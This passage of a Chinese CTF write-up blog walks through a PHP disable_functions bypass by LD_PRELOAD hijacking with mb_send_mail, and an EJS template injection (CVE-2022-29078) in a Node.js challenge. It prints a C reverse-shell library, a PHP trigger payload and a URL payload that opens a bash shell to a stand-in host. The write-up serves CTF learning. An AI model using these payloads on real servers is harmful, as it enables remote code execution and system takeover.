+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191518322-1944982368.png" alt="image-20240607191515814"></p>
+<p>但是查看一下<code>disable_functions、disable_classes</code> 把很多的函数和类给禁用了,还限制了<code>open_basedir=/var/www/html:/tmp</code></p>
+<p>所以我们需要想办法 <code>php disable_function bypass</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191538245-1265049974.png" alt="image-20240607191536009"></p>
+<p><strong>劫持LD_PRELOAD绕过disable_functions</strong></p>
+<blockquote>
+<p>LD_PRELOAD指定的动态链接库文件，会在其它文件调用之前先被调用</p>
+<p>劫持步骤：</p>
+<ol>
+<li>生成一个我们的恶意动态链接库文件</li>
+<li>利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径</li>
+<li>配合php的某个函数去触发我们的恶意动态链接库文件</li>
+<li>Getshell</li>
+</ol>
+</blockquote>
+<p>这个php的函数很关键。可以使用<code>mail、error_log</code>等，但是这里被禁用了</p>
+<p>我们还可以使用<code>mb_send_mail()</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191545005-427713125.png" alt="image-20240607191542830"></p>
+<p>它是<code>mail()</code>的包装函数，因此也可以进行劫持</p>
+<p>我们需要先编写一个恶意poc.c文件：(用来反弹shell)</p>
+<blockquote>
+<p>__attribute__语法格式为：<strong>attribute</strong> ( ( attribute-list ) )
+若函数被设定为constructor属性，则该函数会在main（）函数执行之前被自动的执行。类似的，若函数被设定为destructor属性，
+则该函数会在main（）函数执行之后或者exit（）被调用后被自动的执行。例如下面的程序：</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nf">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="nf">angel</span> <span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/vpsip/port 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>然后编译一下生成恶意动态链接程序<code>poc.so</code>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">gcc -c -fPIC poc.c -o poc
+</span></span><span class="line"><span class="cl">gcc --share poc -o poc.so
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191554006-1255129554.png" alt="image-20240607191551703"></p>
+<p>然后需要把这个文件给上传到服务器上去，并且使用<code>putenv()</code>函数重新设置<code>LD_PRELOAD</code>环境变量，最后使用<code>mb_send_mail()</code>调用恶意的函数进行反弹shell</p>
+<p>但是这里有个问题，我们没权限上传文件和写文件，相关函数被禁用了。</p>
+<p>这里有一种方法是上传临时文件<code>/tmp/phpxxx</code>，然后使用<code>scandir(&quot;glob:///tmp/php*&quot;)</code>去模糊匹配的</p>
+<p>在本地写一个上传文件的<code>html</code>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>POST文件上传<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;url&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;file&#34;</span><span class="p">&gt;</span>文件名：<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span>  <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;file&#34;</span>  <span class="na">id</span><span class="o">=</span><span class="s">&#34;file&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">&lt;</span><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;提交&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>将恶意的<code>.so</code>文件上传并抓包，将数据包下面内容进行更改：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;1&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">var_dump<span class="o">(</span>scandir<span class="o">(</span><span class="s1">&#39;/tmp&#39;</span><span class="o">))</span><span class="p">;</span><span class="nv">$a</span><span class="o">=</span>scandir<span class="o">(</span><span class="s2">&#34;glob:///tmp/php*&#34;</span><span class="o">)</span><span class="p">;</span><span class="nv">$filename</span><span class="o">=</span><span class="s2">&#34;/tmp/&#34;</span>.<span class="nv">$a</span><span class="o">[</span>0<span class="o">]</span><span class="p">;</span>var_dump<span class="o">(</span><span class="nv">$filename</span><span class="o">)</span><span class="p">;</span>putenv<span class="o">(</span><span class="s2">&#34;LD_PRELOAD=</span><span class="nv">$filename</span><span class="s2">&#34;</span><span class="o">)</span><span class="p">;</span>mb_send_mail<span class="o">(</span><span class="s2">&#34;&#34;</span>,<span class="s2">&#34;&#34;</span>,<span class="s2">&#34;&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191603773-362245868.png" alt="image-20240607191601339"></p>
+<p>发送后，可以看到，反弹shell成功了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191617064-2120297057.png" alt="image-20240607191614906"></p>
+<p>利用的是php产生的临时文件，而这个临时文件的文件名是<strong>随机</strong>的，因此用<strong>glob伪协议</strong>去锁定。然后劫持</p>
+<p>触发LD_PRELOAD的函数，常见的2个<code>mail、error_log</code>都可以触发系统函数<code>send_mail</code>进而触发LD劫持，但是这里ban了这2个函数，因此还有个替代品<code>mb_send_mail</code>最后RCE</p>
+<p>在根目录下查看到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191630804-1894573378.png" alt="image-20240607191628575"></p>
+<p>但是发现没有权限：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191637136-1283389099.png" alt="image-20240607191634986"></p>
+<p>用环境变量提权。因为我们有一个suid的二进制文件<code>showmsg</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191644575-741172198.png" alt="image-20240607191642261">提权成功，然后给777权限给flag，直接读就好了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191654692-265270369.png" alt="image-20240607191652430"></p>
+<h2 id="post-crad-for-you">
+<a class="header-anchor" href="#post-crad-for-you"></a>
+Post Crad For You
+</h2><p>先拿到题目代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;crypto&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">templateDir</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;template&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;view engine&#39;</span><span class="p">,</span> <span class="s1">&#39;ejs&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;template&#39;</span><span class="p">,</span> <span class="nx">templateDir</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">sleep</span><span class="p">(</span><span class="nx">milliSeconds</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">StartTime</span> <span class="o">=</span><span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">getTime</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">getTime</span><span class="p">()</span> <span class="o">&lt;</span><span class="nx">StartTime</span><span class="o">+</span><span class="nx">milliSeconds</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="s1">&#39;./index.html&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">root</span><span class="o">:</span> <span class="nx">__dirname</span><span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/create&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">uuid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">name</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">address</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">address</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">message</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">do</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">uuid</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomUUID</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nx">fs</span><span class="p">.</span><span class="nx">existsSync</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">templateDir</span><span class="si">}</span><span class="sb">/</span><span class="si">${</span><span class="nx">uuid</span><span class="si">}</span><span class="sb">.ejs`</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">address</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">message</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">source</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;source&#34;</span><span class="p">,</span> <span class="s2">&#34;source1&#34;</span><span class="p">,</span> <span class="s2">&#34;source2&#34;</span><span class="p">,</span> <span class="s2">&#34;source3&#34;</span><span class="p">].</span><span class="nx">sort</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mf">0.5</span> <span class="o">-</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="p">})</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">fs</span><span class="p">.</span><span class="nx">readFile</span><span class="p">(</span><span class="nx">source</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="s2">&#34;.html&#34;</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">,</span><span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">pageContent</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">templateDir</span><span class="si">}</span><span class="sb">/</span><span class="si">${</span><span class="nx">uuid</span><span class="si">}</span><span class="sb">.ejs`</span><span class="p">,</span> <span class="nx">pageContent</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/--ID--/g</span><span class="p">,</span> <span class="nx">uuid</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/-/g</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">sleep</span><span class="p">(</span><span class="mi">2000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">})</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Params `name` or `address` or `message` empty&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Failed to write file&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="sb">`/page?pageid=</span><span class="si">${</span><span class="nx">uuid</span><span class="si">}</span><span class="sb">&amp;name=</span><span class="si">${</span><span class="nx">name</span><span class="si">}</span><span class="sb">&amp;address=</span><span class="si">${</span><span class="nx">address</span><span class="si">}</span><span class="sb">&amp;message=</span><span class="si">${</span><span class="nx">message</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/page&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">pageid</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="sr">/^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">id</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">fs</span><span class="p">.</span><span class="nx">existsSync</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">templateDir</span><span class="si">}</span><span class="sb">/</span><span class="si">${</span><span class="nx">id</span><span class="si">}</span><span class="sb">.ejs`</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Sorry, no such id&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">templateDir</span><span class="si">}</span><span class="sb">/</span><span class="si">${</span><span class="nx">id</span><span class="si">}</span><span class="sb">.ejs`</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`App listening on port </span><span class="si">${</span><span class="nx">port</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span></code></pre></div><p>发现<code>res.render(`${templateDir}/${id}.ejs`, req.query);</code>这段有模板注入的，他把query放进去render了。</p>
+<p>网上是有关于这个的CVE：<a href="https://inhann.top/2023/03/26/ejs/">CVE-2022-29078</a></p>
+<p><strong>payload：</strong></p>
+<p>在url后加入：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">&amp;settings[view options][escapeFunction]=console.log;this.global.process.mainModule.require(&#39;child_process&#39;).execSync(&#34;bash%20-c%20&#39;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%20%3C%261&#39;&#34;);&amp;settings[view options][client]=true
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191716473-2064343561.png" alt="image-20240607191713978"></p>
+<p>反弹shell成功！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191726007-1545553940.png" alt="image-20240607191723486"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191731934-1706873529.png" alt="image-20240607191729610"></p></div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/ctf"
+        rel="tag"
+        >CTF</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap right"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_128.webp"
+              data-sizes="auto"
+              alt="DASCTF X 0psu3十一月挑战赛 2023"
+              class="lazyload"
+            /><a
+          href="/post/dasctf-x-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-2023/"
+          aria-label="后一篇:DASCTF X 0psu3十一月挑战赛 2023"
+          title="后一篇:DASCTF X 0psu3十一月挑战赛 2023"
+        ></a>
+        <div class="article-nav-caption">后一篇</div>
+        <h3 class="article-nav-title">DASCTF X 0psu3十一月挑战赛 2023</h3>
+      </div></nav></article><section id="comments" data-aos="fade-up">
+<div class="comment-header"><h2 class="comment-title">说些什么吧！</h2>
+  <div class="comment-selector">
+    <div class="comment-selector-wrap"><div class="selector-item" data-selector="gitalk">
+          <span>gitalk</span>
+        </div></div>
+  </div>
+</div>
+
+<div class="comment-content"><div class="comment gitalk-comment" data-aos="fade-up"
+     id="gitalk-comment">
+    </div></div>
+</section></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2025<span class="footer-info-sep rotate"></span>
+      Ya1orin
+    </div><div>
+        基于&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Hugo</a
+        >&nbsp; Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;97.1k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;03:38</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#misc">MISC</a>
+      <ul>
+        <li><a href="#与ai共舞的哈夫曼">与AI共舞的哈夫曼</a></li>
+        <li><a href="#codes">codes</a></li>
+        <li><a href="#陌生的语言">陌生的语言</a></li>
+        <li><a href="#小叮弹钢琴">小叮弹钢琴</a></li>
+        <li><a href="#你也喜欢三月七么">你也喜欢三月七么</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">web</a>
+      <ul>
+        <li><a href="#ezjava_chekin">Ezjava_Chekin</a></li>
+        <li><a href="#ez_include">Ez_include</a></li>
+        <li><a href="#post-crad-for-you">Post Crad For You</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" />
+        </div>
+      </div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
